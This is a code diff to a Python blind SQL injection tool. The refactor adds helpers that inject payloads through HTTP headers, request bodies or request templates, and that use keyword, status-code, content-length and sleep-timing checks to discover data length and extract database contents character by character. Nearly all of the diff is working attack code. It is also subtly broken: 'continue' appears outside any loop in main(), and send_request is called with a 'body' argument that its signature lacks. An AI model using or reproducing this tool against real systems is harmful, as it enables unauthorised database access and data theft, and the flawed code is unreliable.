@@ -43,23 +43,18 @@ def is_injectable(url, request_template=None, injectable_headers={}, static_head
             print(f"[VERBOSE] Testing condition: {condition}")
             print(f"[VERBOSE] Payload: {payload} | Encoded Payload: {encoded_payload}")
         
-        start_time = time.time()
         try:
-            if request_template:
-                injected_template = request_template.replace("INJECT", encoded_payload)
-                method, url, headers, body = parse_request_template(injected_template)
-                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-            else:
-                headers = {**static_headers}
-                for key, value in injectable_headers.items():
-                    headers[key] = value + encoded_payload
-                if args.data:
-                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-                else:
-                    response = requests.get(url, headers=headers, timeout=args.timeout)
-
-            end_time = time.time()
-            response_time = end_time - start_time
+            response, response_time = injection(
+                url=url, 
+                encoded_payload=encoded_payload, 
+                request_template=request_template, 
+                injectable_headers=injectable_headers, 
+                static_headers=static_headers, 
+                args=args
+                )
+            
+            if not response:
+                return None, None
             
             if args.delay > 0:
                 if args.verbose:
@@ -145,23 +140,18 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
                     payload = f"' AND {sleep_function}"
                     encoded_payload = quote(payload)
 
-                    start_time = time.time()
                     try: 
-                        if request_template:
-                            injected_template = request_template.replace("INJECT", encoded_payload)
-                            method, url, headers, body = parse_request_template(injected_template)
-                            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-                        else:
-                            headers = {**static_headers}
-                            for key, value in injectable_headers.items():
-                                headers[key] = value + encoded_payload
-                            if args.data:
-                                response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-                            else:
-                                response = requests.get(url, headers=headers, timeout=args.timeout)
-
-                        end_time = time.time()
-                        response_time = end_time - start_time
+                        response, response_time = injection(
+                            url=url, 
+                            encoded_payload=encoded_payload, 
+                            request_template=request_template, 
+                            injectable_headers=injectable_headers, 
+                            static_headers=static_headers, 
+                            args=args
+                            )
+                        
+                        if not response:
+                            return None, None
 
                         if response_time > 5:
                             print(f"[+] Sleep-based detection: Database detected as {db_name}")
@@ -212,35 +202,23 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
         if args.verbose:
             print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
 
-        start_time = time.time()
-
         try:
-            if request_template:
-                injected_template = request_template.replace("INJECT", encoded_payload)
-                method, url, headers, body = parse_request_template(injected_template)
-                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-            else:
-                headers = {**static_headers}
-                for key, value in injectable_headers.items():
-                    headers[key] = value + encoded_payload
-                if args.data:
-                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-                else:
-                    response = requests.get(url, headers=headers, timeout=args.timeout)
-
+            response, response_time = injection(
+                url=url, 
+                encoded_payload=encoded_payload, 
+                request_template=request_template, 
+                injectable_headers=injectable_headers, 
+                static_headers=static_headers, 
+                args=args
+                )
+            
+            if not response:
+                return None, None
+            
             if args.delay > 0:
                 if args.verbose:
                     print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                 time.sleep(args.delay)
-            
-            end_time = time.time()
-            response_time = end_time - start_time
-            
-            if args.verbose:
-                print(f"[VERBOSE] Response time: {response_time} seconds")
-                print(f"[VERBOSE] Response status code: {response.status_code}")
-                print(f"[VERBOSE] Response content length: {len(response.text)}")
-                print(f"[VERBOSE] Response headers: {response.headers}")
 
             if detection == "keyword":
                 if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
@@ -274,29 +252,18 @@ def detect_database(url, request_template=None, injectable_headers={}, static_he
                 if args.verbose:
                     print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")
 
-                start_time = time.time()
                 try:
-                    if request_template:
-                        injected_template = request_template.replace("INJECT", encoded_payload)
-                        method, url, headers, body = parse_request_template(injected_template)
-                        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-                    else:
-                        headers = {**static_headers}
-                        for key, value in injectable_headers.items():
-                            headers[key] = value + encoded_payload
-                        if args.data:
-                            response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-                        else:
-                            response = requests.get(url, headers=headers, timeout=args.timeout)
-
-                    end_time = time.time()
-                    response_time = end_time - start_time
-
-                    if args.verbose:
-                        print(f"[VERBOSE] Response time: {response_time} seconds")
-                        print(f"[VERBOSE] Response status code: {response.status_code}")
-                        print(f"[VERBOSE] Response content length: {len(response.text)}")
-                        print(f"[VERBOSE] Response headers: {response.headers}")
+                    response, response_time = injection(
+                        url=url, 
+                        encoded_payload=encoded_payload, 
+                        request_template=request_template, 
+                        injectable_headers=injectable_headers, 
+                        static_headers=static_headers, 
+                        args=args
+                        )
+                    
+                    if not response:
+                        return None, None
 
                     if response_time > 5:
                         print(f"[+] Sleep-based detection: Database detected as {db_name}")
@@ -331,41 +298,14 @@ def extract_data(url, table, column, where_clause, string_function, extracted_da
 
         while True:
             found_char = False
-
             for char in CHARSET:
-                sleep_function = version_queries[db_name].get("sleep_function", None)
-                if sleep_function:
-                    for db_specific, sleep_query in sleep_function.items():
-                        payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}"
-                        encoded_payload = quote(payload)
-
-                        start_time = time.time()
-                        try:
-                            if request_template:
-                                injected_template = request_template.replace("INJECT", encoded_payload)
-                                method, url, headers, body = parse_request_template(injected_template)
-                                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-                            else:
-                                headers = {**static_headers}
-                                for key, value in injectable_headers.items():
-                                    headers[key] = value + encoded_payload
-                                if args.data:
-                                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-                                else:
-                                    response = requests.get(url, headers=headers, timeout=args.timeout)
-
-                            end_time = time.time()
-                            response_time = end_time - start_time
-
-                            if response_time > 5:
-                                extracted_data += char
-                                print(f"[+] Sleep-based character found: {char} at position {position}")
-                                position += 1
-                                found_char = True
-                                break
-
-                        except requests.exceptions.RequestException as e:
-                            print(f"[-] Error during sleep-based extraction: {e}")
+                result = sleep_based_extraction(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, db_name, args)
+                
+                if result:
+                    extracted_data += result
+                    position += 1
+                    found_char = True
+                    break
 
             if not found_char:
                 print(f"Data extraction complete: {extracted_data}")
@@ -404,106 +344,27 @@ def extract_data(url, table, column, where_clause, string_function, extracted_da
     # Step 2: Iterate through possible characters
     while True:
         found_char = False
-
         for char in CHARSET:
-            payload = (f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), "
-                       f"{position}, 1) = '{char}")
-            encoded_payload = quote(payload)
+            result = extract_character(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, args)
 
-            try:
-                if request_template:
-                    injected_template = request_template.replace("INJECT", encoded_payload)
-                    method, url, headers, body = parse_request_template(injected_template)
-                    response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-                else:
-                    headers = {**static_headers}
-                    for key, value in injectable_headers.items():
-                        headers[key] = value + encoded_payload
-                    if args.data:
-                        response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-                    else:
-                        response = requests.get(url, headers=headers, timeout=args.timeout)
+            if result:
+                extracted_data += result
+                print(f"Character found: {char} at position {position}")
+                position += 1
+                found_char = True
+                break
 
-                if args.delay > 0:
-                    time.sleep(args.delay)
-
-                if method == "keyword":
-                    if args.true_keywords:
-                        if any(keyword in response.text for keyword in args.true_keywords):
-                            extracted_data += char
-                            print(f"Character found: {char} at position {position}")
-                            found_char = True
-                            position += 1
-                            break
-                    if args.false_keywords:
-                        if any(keyword in response.text for keyword in args.false_keywords):
-                            print(f"[VERBOSE] False condition detected for character: {char}")
-                            continue
-                    continue
-                elif method == "status":
-                    if response.status_code != baseline_status_code:
-                        extracted_data += char
-                        print(f"Character found: {char} at position {position}")
-                        found_char = True
-                        position += 1
-                        break
-                elif method == "content":
-                    response_content_length = len(response.text)
-                    if response_content_length != baseline_content_length:
-                        extracted_data += char
-                        print(f"Character found: {char} at position {position}")
-                        found_char = True
-                        position += 1
-                        break
-
-                if args.verbose:
-                    print(f"[VERBOSE] Sent request with encoded payload: {encoded_payload}")
-                    print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
-
-            except requests.exceptions.RequestException as e:
-                print(f"[-] Error during data extraction: {e}")
-                return extracted_data
-
-        # Sleep-based detection as a last resort
+        # If no character was found, check sleep-based extraction as a fallback
         if not found_char:
             print("[*] Fallback: Attempting sleep-based extraction...")
             for char in CHARSET:
-                sleep_function = version_queries[db_name].get("sleep_function", None)
-                if sleep_function:
-                    for db_specific, sleep_query in sleep_function.items():
-                        payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}"
-                        encoded_payload = quote(payload)
-
-                        if args.verbose:
-                            print(f"[VERBOSE] Sending request with payload: {payload} | Encoded: {encoded_payload}")
-
-                        start_time = time.time()
-                        try:
-                            if request_template:
-                                injected_template = request_template.replace("INJECT", encoded_payload)
-                                method, url, headers, body = parse_request_template(injected_template)
-                                response = send_request(method=method, url=url, headers=headers, body=body, args=args)
-                            else:
-                                headers = {**static_headers}
-                                for key, value in injectable_headers.items():
-                                    headers[key] = value + encoded_payload
-                                if args.data:
-                                    response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
-                                else:
-                                    response = requests.get(url, headers=headers, timeout=args.timeout)
-
-                            end_time = time.time()
-                            response_time = end_time - start_time
-
-                            if response_time > 5:
-                                extracted_data += char
-                                print(f"[+] Sleep-based character found: {char} at position {position}")
-                                position += 1
-                                found_char = True
-                                break
-
-                        except requests.exceptions.RequestException as e:
-                            print(f"[-] Error during sleep-based extraction: {e}")
+                result = sleep_based_extraction(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, db_name, args)
+                
+                if result:
+                    extracted_data += result
+                    position += 1
+                    found_char = True
+                    break
 
             if not found_char:
                 print(f"Data extraction complete: {extracted_data}")
@@ -540,7 +401,7 @@ def parse_request_template(file_content):
         raise ValueError("Invalid request line: Unable to parse method and URL")
     
     headers = {}
-    body = None
+    body = ""
     is_body = False
 
     for line in lines[1:]:
@@ -551,10 +412,7 @@ def parse_request_template(file_content):
             continue
 
         if is_body:
-            if body is None:
-                body = line
-            else:
-                body += "\n" + line
+            body += line + "\n" if line else ""
         else:
             if ': ' in line:
                 key, value = line.split(':', 1)
@@ -562,6 +420,7 @@ def parse_request_template(file_content):
             else:
                 raise ValueError(f"Invalid header format: {line}")
 
+    body = body.rstrip("\n")
     return method, url, headers, body
 
 def send_request(url=None, headers=None, data=None, method="GET", args=None):
@@ -572,7 +431,7 @@ def send_request(url=None, headers=None, data=None, method="GET", args=None):
         if method == "POST":
             response = requests.post(url, headers=headers, data=data, timeout=args.timeout)
         elif method == "PUT":
-            response = requests.put(url, headers=headers, date=data, timeout=args.timeout)
+            response = requests.put(url, headers=headers, data=data, timeout=args.timeout)
         elif method == "PATCH":
             response = requests.patch(url, headers=headers, data=data, timeout=args.timeout)
         elif method == "GET":
@@ -587,6 +446,166 @@ def send_request(url=None, headers=None, data=None, method="GET", args=None):
     except requests.exceptions.RequestException as e:
         print(f"[-] Error during {method} request: {e}")
         return None
+
+def injection(url, encoded_payload, request_template, injectable_headers, static_headers, args):
+    """
+    Prepares the request by injecting the payload into the request template or headers and sends the request.
+    Handles both GET and POST methods and returns the response, response time, and any errors encountered.
+    """
+    try:
+        start_time = time.time()
+
+        if request_template:
+            injected_template = request_template.replace("INJECT", encoded_payload)
+            method, url, headers, body = parse_request_template(injected_template)
+            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
+        else:
+            headers = {**static_headers}
+            for key, value in injectable_headers.items():
+                headers[key] = value + encoded_payload
+            if args.data:
+                response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
+            else:
+                response = requests.get(url, headers=headers, timeout=args.timeout)
+
+        end_time = time.time()
+        response_time = end_time - start_time
+
+        if args.verbose:
+            print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
+            print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
+            print(f"[VERBOSE] Request time: {response_time} seconds")
+            print(f"[VERBOSE] Response Headers: {response.headers}")
+
+        return response, response_time
+        
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error during request: {e}")
+        return None, None
+
+def discover_data_length(url, table, column, where_clause, string_function, max_length=100, request_template=None, injectable_headers={}, static_headers={}, args=None):
+    """
+    Helper function to discover the length of the data to extract.
+    It returns the length of the data if found, or None if unsuccessful.
+    """
+    if args.verbose:
+        print(f"[VERBOSE] Attempting to discover the length of the data for {table}.{column}...")
+
+    for length in range(1, max_length + 1):
+        payload = f"' AND {string_function}(LENGTH((SELECT {column} FROM {table} WHERE {where_clause}))) = {length}"
+        encoded_payload = quote(payload)
+
+        try:
+            response, _ = injection(
+                url=url,
+                encoded_payload=encoded_payload,
+                request_template=request_template,
+                injectable_headers=injectable_headers,
+                static_headers=static_headers,
+                args=args
+            )
+
+            if not response:
+                return None
+
+            if args.verbose:
+                print(f"[VERBOSE] Sent request with payload to discover length: {encoded_payload}")
+                print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
+
+            if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
+                print(f"[+] Data length discovered: {length}")
+                return length
+
+            if args.status_code and response.status_code == args.true_status_code:
+                print(f"[+] Data length discovered: {length}")
+                return length
+
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Error during length discovery: {e}")
+            return None
+
+    print(f"[-] Failed to discover data length within the maximum length {max_length}. Attempting data extraction without data lenth.")
+    return None
+
+def extract_character(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, detection_method, baseline_status_code, baseline_content_length, args):
+    """
+    Handles character extraction using status code, content length, or keyword-based detection methods.
+    """
+    payload = (f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}")
+    encoded_payload = quote(payload)
+
+    try:
+        response, response_time = injection(
+            url=url,
+            encoded_payload=encoded_payload,
+            request_template=request_template,
+            injectable_headers=injectable_headers,
+            static_headers=static_headers,
+            args=args
+        )
+
+        if not response:
+            return None
+
+        if args.delay > 0:
+            if args.verbose:
+                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+            time.sleep(args.delay)
+
+        if detection_method == "keyword":
+            if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
+                return char
+            if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
+                return None
+        elif detection_method == "status":
+            if response.status_code != baseline_status_code:
+                return char
+        elif detection_method == "content":
+            response_content_length = len(response.text)
+            if response_content_length != baseline_content_length:
+                return char
+
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Error during character extraction for character {char}: {e}")
+        return None
+
+    return None
+
+def sleep_based_extraction(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, db_name, args):
+    """
+    Handles the sleep-based character extraction.
+    """
+    sleep_function = version_queries[db_name].get("sleep_function", None)
+    if sleep_function:
+        for db_specific, sleep_query in sleep_function.items():
+            payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}"
+            encoded_payload = quote(payload)
+
+            try:
+                response, response_time = injection(
+                    url=url,
+                    encoded_payload=encoded_payload,
+                    request_template=request_template,
+                    injectable_headers=injectable_headers,
+                    static_headers=static_headers,
+                    args=args
+                )
+
+                if not response:
+                    return None
+
+                if response_time > 5:
+                    print(f"[+] Sleep-based character found: {char} at position {position}")
+                    if args.delay > 0:
+                        if args.verbose:
+                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
+                        time.sleep(args.delay)
+                    return char
+
+            except requests.exceptions.RequestException as e:
+                print(f"[-] Error during sleep-based extraction for character {char}: {e}")
+
+    return None
 
 def main():
     parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")
@@ -614,8 +633,12 @@ def main():
     if args.url and not (args.injectable_headers or args.data):
         print("[-] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
         return
-    if (args.headers or args.data) and not (args.table or args.column or args.where):
+    if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
         print("[-] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
+        return
+    if args.data and args.file:
+        print ("[-] You cannot specify data for the request file outside of the request file.")
+        return
 
     injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
     static_headers = dict(args.static_header) if args.static_header else {}
@@ -651,6 +674,24 @@ def main():
     # Step 3: Extract the data
     extracted_data = ""
     position = 1
+
+    data_length = discover_data_length(
+        url=args.url,
+        table=args.table,
+        column=args.column,
+        where_clause=args.where,
+        string_function=string_function,
+        request_template=request_template,
+        injectable_headers=injectable_headers,
+        static_headers=static_headers,
+        args=args
+    )
+
+    if data_length:
+        print(f"[+] Data length to extract: {data_length}")
+    else:
+        continue
+
     if args.table and args.column and args.where:
         extracted_data = extract_data(
             args.url, 
@@ -664,7 +705,7 @@ def main():
             db_type,
             request_template,
             static_headers,
-            extractrion=detection,
+            extraction=detection,
             args=args
         )
         print(f"Extracted data: {extracted_data}")
